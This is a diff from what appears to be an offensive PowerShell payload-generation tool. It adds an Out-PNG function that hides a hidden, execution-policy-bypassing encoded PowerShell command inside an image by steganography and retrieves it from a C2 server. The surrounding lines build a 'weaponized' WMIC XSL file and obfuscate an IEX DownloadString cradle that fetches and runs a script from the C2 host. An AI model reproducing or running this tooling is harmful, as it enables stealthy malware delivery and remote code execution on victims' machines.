@@ -572,6 +572,13 @@ wmic os get /format:"$c2c/$rootfolder/link/wmic.xsl"
 Out-Wmic
 Write-Host "Weaponized WMIC file "
 
+function Out-PNG {
+Import-Module .\stego.ps1
+echo "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $enc" > .\bat\pnt.ps1
+Set-PowerStego -Method Hide -ImageSource File -ImageSourcePath .\$evilimage -ImageDestinationPath .\png\$evilimage -PayloadSource Text -PayloadPath .\bat\pnt.ps1
+Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath $c2c/$rootfolder/link/$evilimage -PayloadSource Text -PayloadPath .\png\imageStego.txt
+}
+
 function Out-Obfuscate {
 	Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString("$c2c/$rootfolder/link/pnt.ps1")} -Command "$obfuscationToken .\bat\pnt-obfuscated.bat" -Quiet
 	Write-Host "Obfuscate > \bat\pnt-obfuscated.bat"
